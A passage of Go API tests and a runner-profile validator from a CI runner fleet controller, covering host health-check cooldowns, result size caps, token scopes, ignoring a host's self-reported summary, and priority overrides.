		res := h.do(request{method: http.MethodPost, path: checkPath(tc.host), cookie: op})
		res.mustStatus(t, http.StatusConflict, tc.name)
		msg, _ := res.json(t)["error"].(map[string]any)["message"].(string)
		if !strings.Contains(msg, tc.want) {
			t.Errorf("%s: message = %q, want it to contain %q", tc.name, msg, tc.want)
		}
	}
	rows, _, _ := h.st.ListAudit(h.ctx, store.AuditFilter{Actions: []string{"host.check_requested"}}, store.Page{Limit: 10})
	if len(rows) != 0 {
		t.Errorf("refusals wrote %d audit rows, want none", len(rows))
	}
}

// The whole round trip over HTTP: the task goes out on the agent's own poll, a
// failed answer ends the request without ending the cooldown, and the asker is
// told how long to wait in a header a client can act on.
func TestAFailedCheckStillHoldsTheCooldownAndSaysHowLong(t *testing.T) {
	h := newHarness(t)
	hostID, token := h.agentToken("check-cooldown")
	if _, err := h.ctrl.Heartbeat(h.ctx, hostID, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Features: []string{agent.FeatureHostCheck}}); err != nil {
		t.Fatal(err)
	}
	_, op := h.user("check-cooldown-op", store.RoleOperator)
	path := "/api/v1/hosts/" + hostID + "/health-check"
	h.do(request{method: http.MethodPost, path: path, cookie: op}).mustStatus(t, http.StatusAccepted, "asking")

	poll := h.do(request{method: http.MethodGet, path: "/api/v1/agent/tasks?wait=2", token: token})
	poll.mustStatus(t, http.StatusOK, "task poll")
	var batch agent.TaskBatch
	poll.into(t, &batch)
	if len(batch.Tasks) != 1 || batch.Tasks[0].Kind != agent.TaskCheckHost {
		t.Fatalf("the agent was handed %+v, want one check_host", batch.Tasks)
	}
	h.do(request{method: http.MethodPost, path: "/api/v1/agent/results", token: token,
		body: agent.TaskResult{TaskID: batch.Tasks[0].ID, Kind: agent.TaskCheckHost, Error: "no luck", CompletedAt: time.Now()}}).
		mustStatus(t, http.StatusNoContent, "a failed answer")

	res := h.do(request{method: http.MethodPost, path: path, cookie: op})
	res.mustStatus(t, http.StatusTooManyRequests, "asking again at once")
	if secs, err := strconv.Atoi(res.header.Get("Retry-After")); err != nil || secs < 1 || secs > 15 {
		t.Errorf("Retry-After = %q, want whole seconds within the 15 s cooldown", res.header.Get("Retry-After"))
	}
	if code := res.json(t)["error"].(map[string]any)["code"]; code != "rate_limited" {
		t.Errorf("code = %v, want rate_limited", code)
	}
}

// A report fills a task result, and the results route caps a body at 1 MiB. The
// report a real host sends fits with room to spare, and so does the largest one
// the controller would accept at all, so a busy host's answer is never cut off
// into a "malformed" refusal that says nothing about the real cause.
func TestAHostCheckResultFitsTheBodyCapAtItsLargestAndIsIngested(t *testing.T) {
	h := newHarness(t)
	hostID, token := h.agentToken("check-result")
	if _, err := h.ctrl.Heartbeat(h.ctx, hostID, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Features: []string{agent.FeatureHostCheck}}); err != nil {
		t.Fatal(err)
	}
	_, op := h.user("check-result-op", store.RoleOperator)
	h.do(request{method: http.MethodPost, path: "/api/v1/hosts/" + hostID + "/health-check", cookie: op}).
		mustStatus(t, http.StatusAccepted, "asking")
	poll := h.do(request{method: http.MethodGet, path: "/api/v1/agent/tasks?wait=2", token: token})
	var batch agent.TaskBatch
	poll.into(t, &batch)
	if len(batch.Tasks) != 1 {
		t.Fatalf("tasks = %+v", batch.Tasks)
	}

	sized := func(n int, field int) *hosttune.Report {
		r := &hosttune.Report{CheckedAt: h.ctrl.Now(), OS: "linux", Distro: "ubuntu 24.04"}
		for i := 0; i < n; i++ {
			r.Results = append(r.Results, hosttune.Result{
				ID: "check." + strconv.Itoa(i), Title: strings.Repeat("t", min(field, 200)), Tier: hosttune.Safe, Status: hosttune.Warn,
				Current: strings.Repeat("c", field), Recommended: strings.Repeat("r", field),
				Rationale: strings.Repeat("a", min(field, 1024)), Reason: strings.Repeat("e", field),
			})
		}
		return r
	}
	largest, _ := json.Marshal(agent.TaskResult{TaskID: "x", Kind: agent.TaskCheckHost, OK: true, Doctor: sized(64, 4096)})
	if len(largest) >= maxBodyBytes {
		t.Fatalf("the largest accepted report is %d bytes, over the %d byte body cap", len(largest), maxBodyBytes)
	}

	realistic := sized(32, 300)
	h.do(request{method: http.MethodPost, path: "/api/v1/agent/results", token: token,
		body: agent.TaskResult{TaskID: batch.Tasks[0].ID, Kind: agent.TaskCheckHost, OK: true, Doctor: realistic, CompletedAt: time.Now()}}).
		mustStatus(t, http.StatusNoContent, "a real-sized answer")
	got, err := h.st.GetHost(h.ctx, hostID)
	if err != nil || got.Doctor.Report == nil || len(got.Doctor.Results) != 32 {
		t.Fatalf("the report was not ingested: %+v, %v", got, err)
	}
}

package api

import (
	"encoding/json"
	"net/http"
	"slices"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/hosttune"
	"github.com/eyupio/zoomies/internal/store"
)

func TestHostAPIIncludesTheLatestDoctorResult(t *testing.T) {
	h := newHarness(t)
	host := h.host("health-host")
	r := &hosttune.Report{CheckedAt: h.ctrl.Now(), OS: "linux", Distro: "ubuntu 24.04", Results: []hosttune.Result{{ID: "disk.space", Title: "Disk space", Tier: hosttune.Safe, Status: hosttune.Warn, Current: "2%", Recommended: "10%", Rationale: "Leave room for builds."}}}
	if _, err := h.ctrl.Heartbeat(h.ctx, host.ID, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Doctor: r}); err != nil {
		t.Fatal(err)
	}
	u, _ := h.user("reader", store.RoleViewer)
	res := h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + host.ID, cookie: h.session(u)})
	res.mustStatus(t, http.StatusOK, "doctor report")
	var v hostResponse
	res.into(t, &v)
	if v.Doctor == nil || len(v.Doctor.Results) != 1 {
		t.Fatalf("missing report: %+v", v.Doctor)
	}
}

// The count beside the results is the controller's, and the document says so:
// the doctor a client reads has every key HostDoctorView describes, and none it
// does not, on the single-host route and in the list. The generated client types
// doctor from that schema, so a key it lacks is one the UI cannot read.
func TestHostAPIRendersTheCountBesideTheResultsAsTheSpecDescribesIt(t *testing.T) {
	doc := loadSpec(t)
	h := newHarness(t)
	host := h.host("counted-host")
	r := &hosttune.Report{
		CheckedAt: h.ctrl.Now(), OS: "linux", Distro: "ubuntu 24.04", WorkDir: "/var/lib/zoomies",
		Results: []hosttune.Result{
			{ID: "disk.space", Title: "Disk space", Tier: hosttune.Safe, Status: hosttune.Warn, Current: "2%", Recommended: "10%", Rationale: "Leave room for builds."},
			{ID: "files.watches", Title: "File watches", Tier: hosttune.Safe, Status: hosttune.OK},
			{ID: "tmp.tmpfs", Title: "Temporary files", Tier: hosttune.Aggressive, Status: hosttune.Warn},
		},
	}
	if _, err := h.ctrl.Heartbeat(h.ctx, host.ID, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Doctor: r}); err != nil {
		t.Fatal(err)
	}
	u, _ := h.user("reader", store.RoleViewer)
	cookie := h.session(u)

	one := h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + host.ID, cookie: cookie})
	one.mustStatus(t, http.StatusOK, "one host")
	list := h.do(request{method: http.MethodGet, path: "/api/v1/hosts", cookie: cookie})
	list.mustStatus(t, http.StatusOK, "list hosts")
	var listed struct {
		Items []json.RawMessage `json:"items"`
	}
	list.into(t, &listed)
	var inList json.RawMessage
	for _, item := range listed.Items {
		var id struct {
			ID string `json:"id"`
		}
		if err := json.Unmarshal(item, &id); err == nil && id.ID == host.ID {
			inList = item
		}
	}
	if inList == nil {
		t.Fatalf("the host is not in the list: %s", truncate(list.body))
	}

	for name, body := range map[string]json.RawMessage{"GET /hosts/{id}": one.body, "GET /hosts": inList} {
		var payload struct {
			Doctor json.RawMessage `json:"doctor"`
		}
		if err := json.Unmarshal(body, &payload); err != nil || payload.Doctor == nil {
			t.Fatalf("%s: no doctor in the host: %s", name, truncate(body))
		}
		assertShape(t, doc, "HostDoctorView", payload.Doctor)

		var doctor struct {
			Results []hosttune.Result          `json:"results"`
			Summary map[string]json.RawMessage `json:"summary"`
		}
		if err := json.Unmarshal(payload.Doctor, &doctor); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if !slices.Equal(doctor.Results, r.Results) {
			t.Errorf("%s: results = %+v, want the report's own, in full, so the count adds to them", name, doctor.Results)
		}
		summary, err := json.Marshal(doctor.Summary)
		if err != nil {
			t.Fatal(err)
		}
		assertShape(t, doc, "HostDoctorSummary", summary)
		var got hosttune.Summary
		if err := json.Unmarshal(summary, &got); err != nil {
			t.Fatal(err)
		}
		// One counted warning, one counted pass, and the aggressive warning
		// a suggestion that is in no other number.
		if want := (hosttune.Summary{Counted: 2, Warnings: 1, Suggestions: 1}); got != want {
			t.Errorf("%s: summary = %+v, want %+v", name, got, want)
		}
	}
}

// A host that has sent no report has no doctor key: an object of zeros would be
// read as a host with nothing to fail.
func TestHostAPIOmitsDoctorForAHostThatHasSentNoReport(t *testing.T) {
	h := newHarness(t)
	host := h.host("silent-host")
	u, _ := h.user("reader", store.RoleViewer)
	res := h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + host.ID, cookie: h.session(u)})
	res.mustStatus(t, http.StatusOK, "host with no report")
	if v, ok := res.json(t)["doctor"]; ok {
		t.Errorf("a host with no report has doctor = %v, want the key absent", v)
	}
}

// An agent writes the report and the controller counts it. The agent protocol
// tolerates unknown fields, so a heartbeat that sends a summary of its own is
// not refused -- it is simply not believed: nothing reads it, nothing stores it,
// and the host's page shows the count of the results it sent. A host that could
// claim "nothing is wrong" in its own words would defeat the point of counting
// it in one place.
func TestAHeartbeatThatSendsItsOwnSummaryHasItIgnoredAndNeverStoresIt(t *testing.T) {
	h := newHarness(t)
	hostID, token := h.agentToken("vm-claims-health")
	checked := h.ctrl.Now()
	resp := h.do(request{method: http.MethodPost, path: agent.PathHeartbeat, token: token, body: map[string]any{
		"protocol_version": agent.ProtocolVersion,
		"capacity":         2,
		"version":          "test",
		"doctor": map[string]any{
			"checked_at":     checked,
			"os":             "linux",
			"distro":         "ubuntu 24.04",
			"container":      false,
			"reboot_pending": false,
			"results": []map[string]any{{
				"id": "disk.space", "title": "Disk space", "tier": "safe", "status": "warn",
				"current": "2%", "recommended": "10%", "rationale": "Leave room for builds.", "actionable": false,
			}},
			// The claim: fifty checks, every one of them fine.
			"summary": map[string]any{"counted": 50, "warnings": 0, "errors": 0, "skipped": 0, "suggestions": 0},
		},
	}})
	resp.mustStatus(t, http.StatusOK, "heartbeat that claims its own summary")

	u, _ := h.user("reader", store.RoleViewer)
	got := h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + hostID, cookie: h.session(u)})
	got.mustStatus(t, http.StatusOK, "host")
	var v hostResponse
	got.into(t, &v)
	if v.Doctor == nil {
		t.Fatal("the report was not stored")
	}
	if want := (hosttune.Summary{Counted: 1, Warnings: 1}); v.Doctor.Summary != want {
		t.Errorf("summary = %+v, want the controller's own count %+v and not the host's claim", v.Doctor.Summary, want)
	}

	// What is on disk is the report as the protocol defines it.
	stored, err := h.st.GetHost(h.ctx, hostID)
	if err != nil {
		t.Fatal(err)
	}
	column, err := stored.Doctor.Value()
	if err != nil {
		t.Fatal(err)
	}
	var fields map[string]json.RawMessage
	if err := json.Unmarshal([]byte(column.(string)), &fields); err != nil {
		t.Fatal(err)
	}
	if _, ok := fields["summary"]; ok {
		t.Errorf("the host's summary was stored: %s", column)
	}
}

// docs/host-health.md says which scopes reach a host's check detail, and a token
// that must not see it is minted from that list. A route the page leaves out, or
// a scope it names that does not open one, is how an operator ends up holding a
// token that reads every host's kernel version and filesystem paths while
// believing it cannot. So the list is held to the routes, and the problems --
// which name a failing check and never carry a value -- are held to that too.
func TestTheCheckDetailReachesTheScopesTheDocsNameAndNoOther(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	host := h.host("detail-host")
	run := h.runner(h.pool(inst, "linux-x64"), host, store.RunnerIdle)
	const value = "9% free of /srv/private/builds"
	r := &hosttune.Report{
		CheckedAt: h.ctrl.Now(), OS: "linux", Distro: "ubuntu 24.04",
		Results: []hosttune.Result{{
			ID: "disk.space", Title: "Disk space", Tier: hosttune.Safe, Status: hosttune.Warn,
			Current: value, Recommended: "10%", Rationale: "Leave room for builds.",
		}},
	}
	if _, err := h.ctrl.Heartbeat(h.ctx, host.ID, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Doctor: r}); err != nil {
		t.Fatal(err)
	}
	title, ok := hosttune.Title("disk.space")
	if !ok {
		t.Fatal("the controller does not know disk.space, so no problem could name it")
	}

	const (
		hostPath    = "/api/v1/hosts/"
		runnerPath  = "/api/v1/runners/"
		problemPath = "/api/v1/problems"
	)
	cases := []struct {
		scope string
		// Which of the three routes the scope opens, and so whether the value
		// is in the body: the first two carry the host's results, the problems
		// carry only the name of the check.
		host, runner, problems bool
	}{
		{scope: "hosts:read", host: true},
		// Any scope on a resource includes reading it, so a token that may only
		// cordon hosts reads them too, and the docs say so.
		{scope: "hosts:cordon", host: true},
		// A runner's detail carries its host, whole.
		{scope: "runners:read", runner: true},
		{scope: "stats:read", problems: true},
		{scope: "pools:read"},
	}
	for _, tc := range cases {
		t.Run(tc.scope, func(t *testing.T) {
			token := h.token("reads "+tc.scope, store.RoleViewer, tc.scope)
			for _, route := range []struct {
				path string
				open bool
			}{
				{hostPath + host.ID, tc.host},
				{runnerPath + run.ID, tc.runner},
				{problemPath, tc.problems},
			} {
				res := h.do(request{method: http.MethodGet, path: route.path, token: token})
				if !route.open {
					res.mustStatus(t, http.StatusForbidden, tc.scope+" on "+route.path)
					continue
				}
				res.mustStatus(t, http.StatusOK, tc.scope+" on "+route.path)
				carriesValue := strings.Contains(string(res.body), value)
				if isProblems := route.path == problemPath; carriesValue == isProblems {
					t.Errorf("%s on %s: the check's value is in the body = %v; the host routes carry it and the problems never do",
						tc.scope, route.path, carriesValue)
				}
				if route.path != problemPath {
					continue
				}
				var got struct {
					Items []struct {
						Code   string `json:"code"`
						Detail string `json:"detail"`
					} `json:"items"`
				}
				res.into(t, &got)
				found := false
				for _, p := range got.Items {
					if p.Code == "host.os_health" {
						found = strings.Contains(p.Detail, title)
					}
				}
				if !found {
					t.Errorf("%s on the problems: no host.os_health entry naming %q: %s", tc.scope, title, truncate(res.body))
				}
			}
		})
	}
}

package api

import (
	"net/http"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// The host's page offers a command to paste into a terminal, with a token made on
// the spot so that nothing has to be fetched or remembered first. The token is
// the whole of what makes that safe to offer on a click: a person who can only
// read, for a quarter of an hour, and able to read hosts and nothing else. This
// makes it as the page does, through the route the page uses, and holds it to
// each of those, so changing a scope's name or the route's reading of a duration
// breaks here and not in a terminal on somebody's host.
func TestTheShortLivedTokenTheHostPageMakesReadsHostsAndNothingElse(t *testing.T) {
	h := newHarness(t)
	host := h.host("cli-host")
	// Anybody signed in may make a token for themselves; a viewer is the least of
	// them, and the page must work for one.
	_, cookie := h.user("reader", store.RoleViewer)

	made := h.do(request{method: http.MethodPost, path: "/api/v1/tokens", cookie: cookie,
		body: map[string]any{
			"name": "doctor cli-host", "role": "viewer",
			"scopes": []string{"hosts:read"}, "expires_in": "15m",
		}})
	made.mustStatus(t, http.StatusCreated, "a viewer makes the page's token")
	var minted createdTokenResponse
	made.into(t, &minted)

	if minted.ExpiresAt == nil {
		t.Fatal("the token never expires; the page promises it ends by itself")
	}
	if left := time.Until(*minted.ExpiresAt); left < 14*time.Minute || left > 15*time.Minute+5*time.Second {
		t.Errorf("the token has %s left, want a quarter of an hour", left)
	}

	h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + host.ID, token: minted.Token}).
		mustStatus(t, http.StatusOK, "the token reads the host, which is what zoomies doctor --host asks for")

	for _, refused := range []struct {
		name, method, path string
		body               any
	}{
		{"another resource", http.MethodGet, "/api/v1/pools", nil},
		{"a change to the host", http.MethodPatch, "/api/v1/hosts/" + host.ID, map[string]any{"capacity": 1}},
		{"a token of its own", http.MethodPost, "/api/v1/tokens", map[string]any{"name": "more", "role": "viewer"}},
	} {
		h.do(request{method: refused.method, path: refused.path, token: minted.Token, body: refused.body}).
			mustStatus(t, http.StatusForbidden, "the token is not enough for "+refused.name)
	}
}

package api

import (
	"fmt"
	"math"

	"github.com/eyupio/zoomies/internal/scheduler"
	"github.com/eyupio/zoomies/internal/store"
)

// validateRunnerProfile checks a host's runner profile the way the pool form
// checks a pool's sizes, and for the same reasons: below a quarter of a core or
// 512 MB a runner cannot be a runner, a minimum above the standard says
// something that cannot be true, and a figure the machine could never give is
// refused when the machine has said what it has.
//
// Zero is not an error and not a value: a field left out follows the fleet's
// setting, which is how every host starts. The measured limits are only applied
// where the agent has measured, because a host that has not reported its
// machine has nothing to compare a size with, and the profile is still saved --
// the scheduler places by slots alone on such a host, exactly as before.
func validateRunnerProfile(h *store.Host, p store.RunnerProfile) []fieldError {
	var errs []fieldError
	add := func(field, msg string) { errs = append(errs, fieldError{"runner_profile." + field, msg}) }
	alloc := h.Allocatable()

	cpuField := func(field string, v float64, what string) {
		switch {
		case math.IsNaN(v) || math.IsInf(v, 0):
			add(field, what+" has to be a number of CPUs")
		case v < 0:
			add(field, what+" cannot be negative; leave it out to follow the fleet's setting")
		case v > 0 && v < store.MinRunnerCPUs:
			add(field, what+" cannot be below a quarter of a core; under that the runner binary cannot keep up with its own job")
		}
	}
	memoryField := func(field string, v int64, what string) {
		switch {
		case v < 0:
			add(field, what+" cannot be negative; leave it out to follow the fleet's setting")
		case v > 0 && v < store.MinRunnerMemoryMB:
			add(field, what+" cannot be below 512 MB; under that the runner binary is killed before it takes a job")
		}
	}
	cpuField("minimum.cpus", p.Minimum.CPUs, "a minimum")
	memoryField("minimum.memory_mb", p.Minimum.MemoryMB, "a minimum")
	cpuField("standard.cpus", p.Standard.CPUs, "a standard size")
	memoryField("standard.memory_mb", p.Standard.MemoryMB, "a standard size")
	cpuField("standard.burst_max_cpus", p.Standard.BurstMaxCPUs, "a burst ceiling")
	memoryField("standard.burst_max_memory_mb", p.Standard.BurstMaxMemoryMB, "a memory ceiling")

	// The in-memory folders' policy. A folder smaller than the floor is not a
	// folder a checkout fits in, and a host that keeps them off has nothing to cap,
	// so saying both is a contradiction rather than a belt and braces.
	switch {
	case p.Tmpfs.MaxMB < 0:
		add("tmpfs.max_mb", "a ceiling cannot be negative; leave it at 0 to set no host ceiling")
	case p.Tmpfs.MaxMB > 0 && p.Tmpfs.MaxMB < store.MinTmpfsMB:
		add("tmpfs.max_mb", fmt.Sprintf("a ceiling below %d MB leaves no folder a checkout fits in; leave it at 0, or keep the folders off here instead", store.MinTmpfsMB))
	case p.Tmpfs.Disabled && p.Tmpfs.MaxMB > 0:
		add("tmpfs.max_mb", "this host keeps in-memory folders off, so there is no folder to put a ceiling on; clear one of the two")
	}
	// The sizes a folder is asked for here, in place of the built-in defaults.
	// Each is held to the same floor as a ceiling, and none means anything on a
	// host that keeps the folders off.
	for _, f := range []struct {
		name string
		mb   int64
	}{{"tmpfs.work_mb", p.Tmpfs.WorkMB}, {"tmpfs.tmp_mb", p.Tmpfs.TmpMB}, {"tmpfs.daemon_mb", p.Tmpfs.DaemonMB}} {
		switch {
		case f.mb < 0:
			add(f.name, "a size cannot be negative; leave it at 0 to use the default")
		case f.mb > 0 && f.mb < store.MinTmpfsMB:
			add(f.name, fmt.Sprintf("a folder below %d MB is not one a checkout fits in; leave it at 0 to use the default", store.MinTmpfsMB))
		case f.mb > 0 && p.Tmpfs.Disabled:
			add(f.name, "this host keeps in-memory folders off, so there is no folder to size; clear one of the two")
		}
	}

	// A minimum above the standard is a floor above the size it floors, which
	// the pool form refuses in the same words.
	if p.Minimum.CPUs > 0 && p.Standard.CPUs > 0 && p.Minimum.CPUs > p.Standard.CPUs {
		add("minimum.cpus", fmt.Sprintf("the minimum (%s CPU) is above the standard size (%s CPU); a runner is never given less than the minimum, so it has to be the smaller of the two",
			scheduler.FormatCPUs(p.Minimum.CPUs), scheduler.FormatCPUs(p.Standard.CPUs)))
	}
	if p.Minimum.MemoryMB > 0 && p.Standard.MemoryMB > 0 && p.Minimum.MemoryMB > p.Standard.MemoryMB {
		add("minimum.memory_mb", fmt.Sprintf("the minimum (%d MB) is above the standard size (%d MB); a runner is never given less than the minimum, so it has to be the smaller of the two",
			p.Minimum.MemoryMB, p.Standard.MemoryMB))
	}
	// The ceiling is the most a runner may use, its guaranteed share included.
	if p.Standard.BurstMaxCPUs > 0 && p.Standard.CPUs > 0 && p.Standard.BurstMaxCPUs < p.Standard.CPUs {
		add("standard.burst_max_cpus", fmt.Sprintf("the burst ceiling (%s CPU) is below the standard size (%s CPU); it is the most a runner may use, its own share included, so it has to be at least the standard",
			scheduler.FormatCPUs(p.Standard.BurstMaxCPUs), scheduler.FormatCPUs(p.Standard.CPUs)))
	}

	// The memory ceiling is the most a runner may hold, its guaranteed share
	// included, so below the standard it would be a request to take memory back.
	if p.Standard.BurstMaxMemoryMB > 0 && p.Standard.MemoryMB > 0 && p.Standard.BurstMaxMemoryMB < p.Standard.MemoryMB {
		add("standard.burst_max_memory_mb", fmt.Sprintf("the memory ceiling (%d MB) is below the standard size (%d MB); it is the most a runner may hold, its own share included, so it has to be at least the standard",
			p.Standard.BurstMaxMemoryMB, p.Standard.MemoryMB))
	}

	// What the machine can give. A standard or a minimum above all of it could
	// never run one runner, which is the host refusing every pool, so it is
	// refused here rather than left to look like a quiet fleet.
	if alloc.CPUsKnown {
		if p.Standard.CPUs > alloc.CPUs+1e-6 {
			add("standard.cpus", fmt.Sprintf("this host has %s allocatable CPUs once its reserve is held back; a standard size of %s CPU could never run a single runner here",
				scheduler.FormatCPUs(alloc.CPUs), scheduler.FormatCPUs(p.Standard.CPUs)))
		}
		if p.Minimum.CPUs > alloc.CPUs+1e-6 {
			add("minimum.cpus", fmt.Sprintf("this host has %s allocatable CPUs once its reserve is held back; a minimum of %s CPU is more than it can give a runner",
				scheduler.FormatCPUs(alloc.CPUs), scheduler.FormatCPUs(p.Minimum.CPUs)))
		}
	}
	if alloc.MemoryKnown {
		if p.Standard.MemoryMB > alloc.MemoryMB {
			add("standard.memory_mb", fmt.Sprintf("this host has %d MB of allocatable memory once its reserve is held back; a standard size of %d MB could never run a single runner here",
				alloc.MemoryMB, p.Standard.MemoryMB))
		}
		if p.Minimum.MemoryMB > alloc.MemoryMB {
			add("minimum.memory_mb", fmt.Sprintf("this host has %d MB of allocatable memory once its reserve is held back; a minimum of %d MB is more than it can give a runner",
				alloc.MemoryMB, p.Minimum.MemoryMB))
		}
	}
	return errs
}

package api

import (
	"net/http"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

func TestAnOperatorChoosesWhetherAHostIsKeptAtItsRecommendation(t *testing.T) {
	h := newHarness(t)
	host := h.host("vm-1")
	host.CPUs, host.MemoryMB, host.DiskTotalMB, host.DiskFreeMB = 36, 128*1024, 40*1024, 30*1024
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatal(err)
	}
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)

	patch := func(body map[string]any) *response {
		return h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie, body: body})
	}
	var view hostResponse
	set := patch(map[string]any{"auto_adjust": "on"})
	set.mustStatus(t, http.StatusOK, "turn it on")
	set.into(t, &view)
	if view.AutoAdjust != "on" || !view.AutoAdjustEffective {
		t.Fatalf("on: %+v", view)
	}
	// An edit that names something else leaves the choice alone.
	patch(map[string]any{"labels": map[string]string{"a": "b"}}).mustStatus(t, http.StatusOK, "other field")
	if got, _ := h.st.GetHost(h.ctx, host.ID); got.AutoAdjust != store.AutoAdjustOn {
		t.Fatal("an unrelated edit changed the choice")
	}
	patch(map[string]any{"auto_adjust": "off"}).into(t, &view)
	if view.AutoAdjust != "off" || view.AutoAdjustEffective {
		t.Fatalf("off: %+v", view)
	}
	patch(map[string]any{"auto_adjust": ""}).into(t, &view)
	if view.AutoAdjust != "" || !view.AutoAdjustEffective {
		t.Fatalf("handed back to the fleet, whose default is on: %+v", view)
	}
	patch(map[string]any{"auto_adjust": "sometimes"}).mustStatus(t, http.StatusUnprocessableEntity, "a value that is not an answer")
}

func TestTheRecommendationRouteSaysWhatAdjustWouldSetAndWhyDiskLimitedIt(t *testing.T) {
	h := newHarness(t)
	host := h.host("vm-1")
	host.CPUs, host.MemoryMB, host.DiskTotalMB, host.DiskFreeMB = 36, 128*1024, 40*1024, 30*1024
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatal(err)
	}
	viewer, _ := h.user("viewer", store.RoleViewer)
	var rec HostRecommendationView
	resp := h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + host.ID + "/recommendation", cookie: h.session(viewer)})
	resp.mustStatus(t, http.StatusOK, "recommendation")
	resp.into(t, &rec)
	if !rec.Available || rec.LimitedBy != "disk" || rec.Capacity < 1 || rec.Capacity >= 16 || rec.Reason == "" || rec.ReserveDiskMB == 0 {
		t.Fatalf("a 40 GB disk should limit the runners: %+v", rec)
	}
	assertShape(t, loadSpec(t), "HostRecommendation", resp.body)

	bare := h.host("vm-2")
	bare.CPUs, bare.MemoryMB, bare.DiskTotalMB = 0, 0, 0
	if err := h.st.UpdateHost(h.ctx, bare); err != nil {
		t.Fatal(err)
	}
	h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + bare.ID + "/recommendation", cookie: h.session(viewer)}).into(t, &rec)
	if rec.Available {
		t.Fatal("a host that has not said how big it is gets no recommendation")
	}
}

package api

import (
	"net/http"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// specdHost is a host whose agent has measured the size and the speed
// figures placement ranks it by, as h.host's bare row will not carry them.
func specdHost(t *testing.T, h *harness, name string) *store.Host {
	t.Helper()
	host := h.host(name)
	host.CPUs, host.MemoryMB, host.CPUMHz, host.MemoryMTs, host.DiskKind = 8, 16*1024, 3600, 4800, "ssd"
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}
	return host
}

// The priority is the one number that says where a host stands in placement,
// so the view carries it and says what set it. Nothing reported is 0, and the
// reason sentence names the specs it came from.
func TestAHostsViewCarriesItsPriority(t *testing.T) {
	h := newHarness(t)
	host := h.host("vm-1")
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}
	operator, _ := h.user("operator", store.RoleOperator)

	view := h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + host.ID, cookie: h.session(operator)})
	view.mustStatus(t, http.StatusOK, "read a host that reports nothing")
	var got hostResponse
	view.into(t, &got)
	if got.Priority != 0 || got.PrioritySource != "computed" {
		t.Errorf("a host with no specs reads priority %d from %q; want the computed 0: %+v", got.Priority, got.PrioritySource, got)
	}

	specpet := specdHost(t, h, "vm-2")
	view = h.do(request{method: http.MethodGet, path: "/api/v1/hosts/" + specpet.ID, cookie: h.session(operator)})
	view.mustStatus(t, http.StatusOK, "read a host with specs")
	view.into(t, &got)
	if got.Priority == 0 || got.PrioritySource != "computed" {
		t.Errorf("a host with specs reads priority %d from %q, want the specs score: %+v", got.Priority, got.PrioritySource, got)
	}
	if got.PriorityReason == "" {
		t.Errorf("the priority block does not say what it was scored from")
	}
}

// The pin is the operator's override: a PATCH sets it, the card says it was
// set, and an override of null hands the ranking back to the specs.
func TestAnOperatorPinsAHostsPriorityAndClearsIt(t *testing.T) {
	h := newHarness(t)
	host := specdHost(t, h, "vm-1")
	operator, _ := h.user("operator", store.RoleOperator)

	pinOrder := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"priority": map[string]any{"override": 90}}})
	pinOrder.mustStatus(t, http.StatusOK, "pin the host")
	var got hostResponse
	pinOrder.into(t, &got)
	if got.Priority != 90 || got.PrioritySource != "overridden" {
		t.Fatalf("after the pin the card reads %d from %q, want the operator's 90", got.Priority, got.PrioritySource)
	}
	stored, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if stored.PriorityOverride == nil || *stored.PriorityOverride != 90 {
		t.Fatalf("the stored pin is %+v, want 90", stored.PriorityOverride)
	}
	if row := lastAudit(t, h, "host.update"); row == nil || row.TargetID != host.ID {
		t.Errorf("the audit row for the pin is %+v", row)
	}

	clear := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"priority": map[string]any{"override": nil}}})
	clear.mustStatus(t, http.StatusOK, "clear the pin")
	clear.into(t, &got)
	if got.PrioritySource != "computed" {
		t.Fatalf("after the clear the card still reads %q, want the spec score", got.PrioritySource)
	}
	stored, err = h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if stored.PriorityOverride != nil {
		t.Fatalf("the stored pin survives a clear: %+v", stored.PriorityOverride)
	}
}

// A pin out of range is refused with the field named, and a field left out
// changes nothing.
func TestAPinOffTheScaleIsRefusedAndAQuietPatchChangesNothing(t *testing.T) {
	h := newHarness(t)
	host := specdHost(t, h, "vm-1")
	operator, _ := h.user("operator", store.RoleOperator)

	off := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"priority": map[string]any{"override": 101}}})
	off.mustStatus(t, http.StatusUnprocessableEntity, "a pin off the scale")

	quiet := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{}})
	quiet.mustStatus(t, http.StatusOK, "a patch that names no priority")
	stored, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
